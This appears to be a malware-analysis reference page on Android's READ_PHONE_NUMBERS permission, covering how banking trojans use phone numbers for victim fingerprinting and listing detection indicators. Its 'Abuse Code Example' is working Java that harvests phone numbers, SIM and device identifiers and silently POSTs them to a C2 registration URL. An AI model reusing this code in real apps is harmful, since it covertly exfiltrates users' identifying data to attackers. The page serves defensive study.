# READ_PHONE_NUMBERS

Allows reading the device's own phone numbers (line numbers for all SIMs). Introduced in Android 8 as a less invasive alternative to `READ_PHONE_STATE` for apps that only need the phone number.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.READ_PHONE_NUMBERS` |
| Protection Level | `dangerous` |
| Permission Group | `PHONE` |
| Grant Method | Runtime permission dialog |
| Introduced | API 26 (Android 8.0) |

## What It Enables

```java
TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
String phoneNumber = tm.getLine1Number();
```

Returns the phone number(s) associated with the device's SIM card(s). Note: this is not always populated, depending on the carrier and SIM configuration.

## Abuse in Malware

### Device Identification

The phone number serves as a persistent identifier for the victim. Malware sends this to C2 during initial registration to uniquely identify the infected device and enable targeted operations (e.g., sending SMS-based C2 commands to this number).

### Account Correlation

Phone numbers can be used to look up social media profiles, messaging accounts, and banking information.

### Notable Families

| Family | Usage |
|--------|-------|
| [Antidot](../../malware/families/antidot.md) | Collects phone number during device fingerprinting for C2 registration alongside IMEI |
| [Mamont](../../malware/families/mamont.md) | Exfiltrates phone number with IMEI and installed banking app list during bot registration |
| [BankBot](../../malware/families/bankbot.md) | Sends phone number in device metadata payload on first C2 contact |
| [Fakecalls](../../malware/families/fakecalls.md) | Collects phone number for device identification and call routing in its vishing operation |
| [MoqHao](../../malware/families/moqhao.md) | Harvests phone number for device profiling and adds it to smishing distribution lists |
| [SoumniBot](../../malware/families/soumnibot.md) | Collects phone number as part of device info alongside IMEI, operator, and installed apps |

Most of these families use `READ_PHONE_STATE` rather than `READ_PHONE_NUMBERS` because they target Android versions below API 26 or because `READ_PHONE_STATE` provides additional data (IMEI, SIM serial) alongside the phone number. On API 30+, `READ_PHONE_STATE` no longer grants phone number access, so malware targeting modern Android versions must use `READ_PHONE_NUMBERS` specifically.

### Banking Trojans

The phone number is combined with other identifiers (IMEI, Android ID, device model) to create a unique victim profile. This allows operators to correlate the infected device with the victim's banking accounts and target them with region-specific overlay injection pages.

The phone number also serves as a routing mechanism: operators can send SMS-based C2 commands to the victim's number, providing a fallback communication channel if HTTP-based C2 infrastructure is taken down.

### Abuse Code Example

```java
public class DeviceFingerprint {

    private final Context context;

    public DeviceFingerprint(Context context) {
        this.context = context;
    }

    public JSONObject collectFingerprint() {
        JSONObject fingerprint = new JSONObject();
        try {
            TelephonyManager tm = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);

            fingerprint.put("phone_number", tm.getLine1Number());

            SubscriptionManager sm = SubscriptionManager.from(context);
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            JSONArray simArray = new JSONArray();
            if (subs != null) {
                for (SubscriptionInfo sub : subs) {
                    JSONObject simInfo = new JSONObject();
                    simInfo.put("number", sub.getNumber());
                    simInfo.put("carrier", sub.getCarrierName());
                    simInfo.put("country", sub.getCountryIso());
                    simInfo.put("slot", sub.getSimSlotIndex());
                    simArray.put(simInfo);
                }
            }
            fingerprint.put("sims", simArray);

            fingerprint.put("model", Build.MODEL);
            fingerprint.put("manufacturer", Build.MANUFACTURER);
            fingerprint.put("sdk", Build.VERSION.SDK_INT);
            fingerprint.put("android_id", Settings.Secure.getString(
                context.getContentResolver(), Settings.Secure.ANDROID_ID));

        } catch (Exception e) {
        }
        return fingerprint;
    }

    public void registerWithC2(String c2Url) {
        try {
            JSONObject payload = collectFingerprint();
            HttpURLConnection conn = (HttpURLConnection)
                new URL(c2Url + "/register").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.getOutputStream().write(payload.toString().getBytes());
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
        }
    }
}
```

The fingerprint includes all SIM phone numbers (dual-SIM devices expose multiple numbers), carrier names, and country codes. This gives operators enough information to identify the victim's region and select appropriate overlay injection targets for local banks.

## Android Version Changes

**Android 8.0 (API 26)**: `READ_PHONE_NUMBERS` introduced as a less invasive alternative to `READ_PHONE_STATE`. Prior to this, reading the phone number required `READ_PHONE_STATE`, which also exposed IMEI, MEID, and other sensitive telephony data.

**Android 10 (API 29)**: `getLine1Number()` restricted. Apps targeting API 29+ must hold `READ_PHONE_NUMBERS` (or `READ_PHONE_STATE` with additional restrictions) to read the phone number. The number is no longer accessible through `READ_PHONE_STATE` alone.

**Android 13 (API 33)**: `getLine1Number()` further restricted across all apps regardless of target SDK. The `SubscriptionManager.getPhoneNumber()` API is the recommended replacement, still requiring `READ_PHONE_NUMBERS`.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
```

Less suspicious than `READ_PHONE_STATE` since it provides less data, but still enables device identification.

### Analysis Indicators

- Look for `TelephonyManager.getLine1Number()` or `SubscriptionManager.getPhoneNumber()` calls followed by network transmission to non-Google endpoints.
- Phone number collection during initial app launch (before any user-initiated action) indicates C2 registration fingerprinting.
- Combined with `READ_PHONE_STATE`, `READ_SMS`, and `INTERNET`, this permission is part of a standard banking trojan device registration payload.
- Dual-SIM enumeration through `SubscriptionManager.getActiveSubscriptionInfoList()` with number extraction is a common pattern in banking trojans targeting regions where dual-SIM usage is prevalent.
- Check for the phone number being stored in `SharedPreferences` or local database alongside other device identifiers -- this is the fingerprint cache used for subsequent C2 communication.

## See Also

- [READ_PHONE_STATE](read-phone-state.md) -- broader telephony permission that also exposed phone numbers before API 30
- [SMS Interception](../../attacks/sms-interception.md) -- phone numbers enable SMS-based C2 targeting and the phone number is essential for operators coordinating SMS-based attacks
- [C2 Techniques](../../attacks/c2-techniques.md) -- device registration and fingerprinting where phone numbers are collected
